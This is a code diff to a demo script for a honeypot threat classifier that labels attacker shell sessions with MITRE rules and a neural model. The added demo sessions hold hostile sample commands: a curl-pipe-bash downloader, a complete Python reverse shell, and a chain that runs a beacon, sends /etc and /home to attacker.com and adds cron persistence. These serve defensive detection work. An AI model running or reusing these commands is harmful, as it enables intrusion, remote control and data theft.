@@ -13,7 +13,7 @@ Or: .venv\Scripts\python src/demo.py (Windows)
 
 Modes:
   --hybrid   Use MITRE rule-based hybrid classifier (default, 90.9% accuracy)
-  --neural   Use neural model only (brain_v5_semantic_balanced.pkl)
+  --neural   Use semantic-trained MITRE-only neural model (brain_v5_mitre_only.pkl)
 """
 
 import sys
@@ -23,6 +23,7 @@ import json
 import argparse
 from pathlib import Path
 from datetime import datetime
+from typing import Optional
 
 # Add src to path for imports
 sys.path.insert(0, str(Path(__file__).parent))
@@ -42,7 +43,8 @@ from training.neural.hybrid_classifier_v2 import HybridClassifierV2
 # ============================================================================
 
 PROJECT_ROOT = Path(__file__).parent.parent
-MODEL_PATH = PROJECT_ROOT / "models" / "brain_v5_semantic_balanced.pkl"
+# Use the mitre_only_semantic_balanced model trained with semantic test case labels
+MODEL_PATH = PROJECT_ROOT / "models" / "brain_v5_mitre_only_semantic_balanced_v2.pkl"
 EXPORTS_PATH = PROJECT_ROOT / "data" / "exports"
 
 # Class definitions
@@ -111,6 +113,33 @@ DEMO_SESSIONS = [
                    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArD...' > .ssh/authorized_keys; "
                    "chmod 600 .ssh/authorized_keys; chattr +ia .ssh",
         "expected": "Destructive"
+    },
+    {
+        "name": "Safe Admin Maintenance",
+        "commands": "apt update; apt list --upgradable; df -h; systemctl status ssh",
+        "expected": "Safe"
+    },
+    {
+        "name": "Recon + Privilege Enumeration",
+        "commands": "uname -a; id; getent passwd; find / -perm -4000 2>/dev/null | head -20",
+        "expected": "Recon"
+    },
+    {
+        "name": "Downloader via curl|bash",
+        "commands": "curl -fsSL http://198.51.100.12/install.sh | bash; systemctl enable updater",
+        "expected": "Downloader"
+    },
+    {
+        "name": "Python Reverse Shell Exploit",
+        "commands": "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.100\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\"])'",
+        "expected": "Exploit"
+    },
+    {
+        "name": "Persistence + Exfiltration Multi-Stage APT",
+        "commands": "wget http://10.0.0.5/beacon.elf -O /tmp/beacon; chmod +x /tmp/beacon; /tmp/beacon; "
+                   "tar czf /tmp/sensitive_data.tgz /etc /home; curl -X POST http://attacker.com/upload -d @/tmp/sensitive_data.tgz; "
+                   "echo '* * * * * /tmp/beacon --persist' >> /var/spool/cron/root; chattr +i /tmp/beacon",
+        "expected": "ADVANCED_APT"
     }
 ]
 
@@ -265,16 +294,22 @@ def classify_with_hybrid(classifier: HybridClassifierV2, commands: str, mitre_an
     }
 
 
-def classify_session(model, tokenizer, device, commands: str, mitre_analysis: dict) -> dict:
+def classify_session(model, tokenizer, device, commands: str, mitre_analysis: dict, 
+                    hybrid_fallback: Optional[HybridClassifierV2] = None, 
+                    confidence_threshold: float = 0.55) -> dict:
     """
-    Classify a session using the neural model.
+    Classify a session using the neural model (MITRE-only variant).
+    
+    With confidence thresholding: if neural confidence < threshold, use hybrid classifier fallback.
     
     Args:
-        model: Trained ThreatClassifier
+        model: Trained ThreatClassifierMitreOnly
         tokenizer: CommandTokenizer
         device: torch device
         commands: Command string
         mitre_analysis: Output from analyze_mitre()
+        hybrid_fallback: Optional HybridClassifierV2 for low-confidence fallback
+        confidence_threshold: Confidence threshold for fallback (default 0.55)
     
     Returns:
         dict with prediction, probabilities, confidence
@@ -284,7 +319,7 @@ def classify_session(model, tokenizer, device, commands: str, mitre_analysis: di
     encoded = encoded.to(device)
     lengths = lengths.to(device)
     
-    # Prepare structured features (100-dim: 21 MITRE + 79 binary)
+    # Prepare structured features (21-dim MITRE only)
     flat = mitre_analysis['flat_features']
     
     # Extract MITRE features (21)
@@ -303,11 +338,8 @@ def classify_session(model, tokenizer, device, commands: str, mitre_analysis: di
     ]:
         mitre_features.append(flat.get(col, 0.0))
     
-    # Binary features (79) - zeros for demo (no actual binary analysis)
-    binary_features = [0.0] * 79
-    
-    # Combine into 100-dim vector
-    structured = torch.tensor([mitre_features + binary_features], dtype=torch.float32).to(device)
+    # Convert to tensor (21-dim MITRE only)
+    structured = torch.tensor([mitre_features], dtype=torch.float32).to(device)
     
     # Run inference
     with torch.no_grad():
@@ -317,6 +349,19 @@ def classify_session(model, tokenizer, device, commands: str, mitre_analysis: di
     probs = probabilities[0].cpu().numpy()
     confidence = probs[pred_class]
     
+    # Confidence thresholding: if confidence too low and hybrid fallback available, use it
+    if hybrid_fallback is not None and confidence < confidence_threshold:
+        hybrid_pred, hybrid_label, hybrid_explanation = hybrid_fallback.classify(commands)
+        return {
+            'predicted_class': hybrid_pred,
+            'predicted_label': hybrid_label,
+            'confidence': 1.0,  # Hybrid is deterministic
+            'probabilities': {name: (1.0 if name == hybrid_label else 0.0) for name in CLASS_NAMES},
+            'description': CLASS_DESCRIPTIONS[hybrid_pred],
+            'fallback_reason': f'Neural confidence {confidence:.1%} < threshold {confidence_threshold:.0%}',
+            'neural_confidence': confidence
+        }
+    
     return {
         'predicted_class': pred_class,
         'predicted_label': CLASS_NAMES[pred_class],
@@ -324,6 +369,7 @@ def classify_session(model, tokenizer, device, commands: str, mitre_analysis: di
         'probabilities': {CLASS_NAMES[i]: float(probs[i]) for i in range(len(CLASS_NAMES))},
         'description': CLASS_DESCRIPTIONS[pred_class]
     }
+
 
 # ============================================================================
 # Display Functions
@@ -458,22 +504,26 @@ def display_model_architecture(model):
     """Display model architecture summary."""
     print_subheader("Neural Model Architecture")
     
-    print(f"  Model: BiLSTM + Structured Features + Attention")
+    print(f"  Model: BiLSTM + MITRE Encoder (Semantic-Trained MITRE-Only Variant)")
     print(f"  Total Parameters: {sum(p.numel() for p in model.parameters()):,}")
     
     # Component breakdown
     text_params = sum(p.numel() for n, p in model.named_parameters() if 'text_encoder' in n)
-    struct_params = sum(p.numel() for n, p in model.named_parameters() if 'structured_encoder' in n)
+    struct_params = sum(p.numel() for n, p in model.named_parameters() if 'mitre' in n.lower())
     fusion_params = sum(p.numel() for n, p in model.named_parameters() if 'fusion' in n)
     
     print(f"\n  Component Parameters:")
     print(f"    - Text Encoder (BiLSTM + Attention): {text_params:,}")
-    print(f"    - Structured Encoder (MLP): {struct_params:,}")
+    print(f"    - MITRE Encoder (MLP): {struct_params:,}")
     print(f"    - Fusion Layers: {fusion_params:,}")
     
     print(f"\n  Input Dimensions:")
     print(f"    - Commands: Character indices (vocab=256, max_len=512)")
-    print(f"    - Structured: 100-dim (21 MITRE + 79 binary features)")
+    print(f"    - MITRE Features: 21-dim (14 tactics + 7 severity/coverage metrics)")
+    
+    print(f"\n  Training Labels:")
+    print(f"    - Source: Semantic command pattern analysis (command intent)")
+    print(f"    - Not binary-based (what binaries downloaded)")
     
     print(f"\n  Output: 6 classes")
     for i, name in enumerate(CLASS_NAMES):
@@ -493,7 +543,7 @@ def run_demo(use_hybrid: bool = True):
     
     print("\n" + "=" * 80)
     print("      ADAPTIVESHIELD - AI-Driven Cyber Deception System")
-    print("            Capstone Phase 2 Review - 10% Implementation")
+
     print("=" * 80)
     print(f"\n  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print(f"  GPU Available: {torch.cuda.is_available()}")
@@ -514,8 +564,12 @@ def run_demo(use_hybrid: bool = True):
         print(f"  Mode: MITRE rule-based classification with priority ordering")
         print(f"  Accuracy on diverse test cases: 90.9% (20/22)")
     else:
-        print_header("1. LOADING NEURAL MODEL")
+        print_header("1. LOADING NEURAL MODEL + HYBRID FALLBACK")
         model, tokenizer, device = load_model()
+        # Also load hybrid classifier as confidence-threshold fallback
+        hybrid_classifier = HybridClassifierV2()
+        print(f"  Hybrid fallback classifier initialized!")
+        print(f"  Mode: Neural with hybrid confidence thresholding (55% threshold)")
     
     # Display architecture (only for neural mode)
     if not use_hybrid and model is not None:
@@ -555,7 +609,9 @@ def run_demo(use_hybrid: bool = True):
                                                    session['commands'], mitre_analysis)
         else:
             classification = classify_session(model, tokenizer, device, 
-                                              session['commands'], mitre_analysis)
+                                              session['commands'], mitre_analysis,
+                                              hybrid_fallback=hybrid_classifier,
+                                              confidence_threshold=0.55)
         
         # Display results
         display_session_analysis(session, mitre_analysis, classification)
@@ -572,7 +628,7 @@ def run_demo(use_hybrid: bool = True):
     print(f"\n  Classifier Mode: {classifier_mode}")
     print(f"  Classification Accuracy: {correct}/{total} ({accuracy:.0f}%)")
     
-    print(f"\n  Key Achievements (10% Milestone):")
+    print(f"\n  Key Achievements :")
     print(f"    [X] Hybrid MITRE classifier (90.9%% accuracy on diverse tests)")
     print(f"    [X] Neural model trained (706K parameters, F1=0.9655)")
     print(f"    [X] MITRE ATT&CK integration (76 patterns, 53 techniques)")
@@ -580,7 +636,7 @@ def run_demo(use_hybrid: bool = True):
     print(f"    [X] 78,504 honeypot sessions processed")
     print(f"    [X] Portable dataset export (111 features per session)")
     
-    print(f"\n  Next Steps (Remaining 90%):")
+    print(f"\n  Next Steps :")
     print(f"    [ ] FastAPI inference service")
     print(f"    [ ] XAI explanations with attention visualization")
     print(f"    [ ] Real-time analyst dashboard")
@@ -660,7 +716,7 @@ if __name__ == '__main__':
     mode_group.add_argument('--hybrid', action='store_true', default=True,
                            help='Use MITRE rule-based hybrid classifier (default, 90.9%% accuracy)')
     mode_group.add_argument('--neural', action='store_true',
-                           help='Use neural model only (brain_v5_semantic_balanced.pkl)')
+                           help='Use semantic-trained MITRE-only neural model (brain_v5_mitre_only.pkl)')
     
     args = parser.parse_args()
     
